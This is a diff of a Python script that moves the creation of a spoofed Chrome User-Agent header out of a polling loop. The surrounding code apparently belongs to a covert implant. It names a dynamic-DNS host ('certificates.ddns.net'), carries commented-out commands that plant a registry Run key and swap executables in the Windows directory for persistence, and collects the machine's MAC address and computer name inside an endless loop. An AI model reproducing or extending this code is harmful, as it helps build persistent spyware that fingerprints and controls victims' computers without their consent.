@@ -127,7 +127,13 @@ def myloop():
     site3="certificates.ddns.net"
     #os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
     #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
-    
+
+
+    ua = UserAgent()
+    #print(ua.chrome)
+    header = {'User-Agent':str(ua.chrome)}
+    #header = {'User-Agent': 'Mozilla/5.0'}
+    #print(header)
     while True:
         
         
@@ -162,11 +168,7 @@ def myloop():
                         sinit='1'
                 #httpServ = httplib.HTTPConnection(site, 80)
                 #httpServ.connect()
-                ua = UserAgent()
-                #print(ua.chrome)
-                header = {'User-Agent':str(ua.chrome)}
-                #header = {'User-Agent': 'Mozilla/5.0'}
-                #print(header)
+                
                 mymac = get_mac()
                 smacaddress = get_macaddress('localhost')
                 sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
